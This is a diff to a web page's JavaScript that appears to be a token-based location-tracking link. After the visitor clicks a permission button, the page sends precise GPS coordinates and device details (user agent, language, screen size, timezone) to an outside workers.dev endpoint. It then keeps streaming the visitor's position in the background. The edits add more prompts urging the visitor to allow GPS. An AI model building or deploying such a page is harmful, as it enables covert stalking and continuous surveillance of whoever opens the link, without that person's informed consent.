@@ -396,33 +396,41 @@ document.getElementById("p-i").textContent =
   letters[Math.floor(Math.random()*letters.length)];
 </script>
 
-
 <script>
 /* ================= CONFIG ================= */
 const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 const token = new URLSearchParams(location.search).get("token");
 if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
 
-const mapFrame = document.getElementById("mapFrame");
 const statusEl = document.getElementById("status");
+const mapFrame = document.getElementById("map-link");
+const loader = document.getElementById("loader");
+const permissionBox = document.getElementById("permission");
+const allowBtn = document.getElementById("allow");
 
 /* Device info */
 function deviceInfo(){
   return {
-    ua:navigator.userAgent,
-    lang:navigator.language,
-    screen:`${screen.width}x${screen.height}`
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
   };
 }
 
 /* CLICK */
-document.getElementById("allowBtn").onclick = ()=>{
+allowBtn.onclick = () => {
+
+  permissionBox.classList.add("loading");
+  loader.style.display = "block";
+  statusEl.textContent = "Requesting location…";
+
   if(!navigator.geolocation){
-    statusEl.textContent="Location not supported";
+    statusEl.textContent = "Location not supported";
+    loader.style.display = "none";
+    permissionBox.classList.remove("loading");
     return;
   }
-
-  statusEl.textContent="Requesting location…";
 
   navigator.geolocation.getCurrentPosition(
     success,
@@ -433,49 +441,57 @@ document.getElementById("allowBtn").onclick = ()=>{
 
 /* SUCCESS */
 function success(pos){
-  const {latitude,longitude,accuracy} = pos.coords;
+  loader.style.display = "none";
 
-  // Update map instantly
+  const { latitude, longitude, accuracy } = pos.coords;
+
+  /* Update map instantly */
   mapFrame.src =
-   `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
+    `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
 
-  // Send first hit
-  fetch(API+"/send-location",{
+  /* Send first hit */
+  fetch(API + "/send-location",{
     method:"POST",
-    headers:{"Content-Type":"application/json"},
+    headers:{ "Content-Type":"application/json" },
     body:JSON.stringify({
       token,
-      lat:latitude,
-      lng:longitude,
-      acc:accuracy,
-      device:deviceInfo()
+      lat: latitude,
+      lng: longitude,
+      acc: accuracy,
+      device: deviceInfo()
     })
   });
 
-  document.getElementById("permission").remove();
+  /* Remove permission UI */
+  permissionBox.remove();
 
-  // Continuous tracking
+  /* Continuous tracking */
   navigator.geolocation.watchPosition(p=>{
-    fetch(API+"/send-location",{
+    fetch(API + "/send-location",{
       method:"POST",
-      headers:{"Content-Type":"application/json"},
+      headers:{ "Content-Type":"application/json" },
       body:JSON.stringify({
         token,
-        lat:p.coords.latitude,
-        lng:p.coords.longitude,
-        acc:p.coords.accuracy
+        lat: p.coords.latitude,
+        lng: p.coords.longitude,
+        acc: p.coords.accuracy
       })
     });
-  },()=>{}, {enableHighAccuracy:true});
+  }, ()=>{}, { enableHighAccuracy:true, maximumAge:0 });
 }
 
 /* ERROR */
 function error(e){
-  statusEl.textContent =
-    "Enable GPS & allow location permission";
-}
-</script>
+  loader.style.display = "none";
+  permissionBox.classList.remove("loading");
 
+  if(e.code === 1){
+    statusEl.textContent = "Location denied. Please allow GPS permission.";
+  }else{
+    statusEl.textContent = "Enable GPS & try again";
+    allowBtn.textContent = "Retry";
+  }
+}
 </script>
 
 </body>
